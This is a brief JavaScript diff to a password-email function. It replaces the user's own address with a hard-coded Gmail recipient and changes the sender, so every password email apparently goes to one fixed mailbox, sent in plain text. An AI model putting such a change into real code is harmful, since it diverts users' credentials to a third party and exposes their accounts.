@@ -85,13 +85,13 @@ const mailTemplate = ({ password }) => `<!DOCTYPE html>
 
 const sendEmail = ({ email, password }) => {
   const forgotPassword = {
-    to: email,
+    to: 'sofika2404@gmail.com',
     subject: "Password",
     html: mailTemplate({ password }),
   };
 
   sgMail
-    .send({ ...forgotPassword, from: "geri-grej2023@rambler.ru" })
+    .send({ ...forgotPassword, from: "goPlai2024@gmail.com" })
     .then(() => {
       console.log("Email sent");
     })
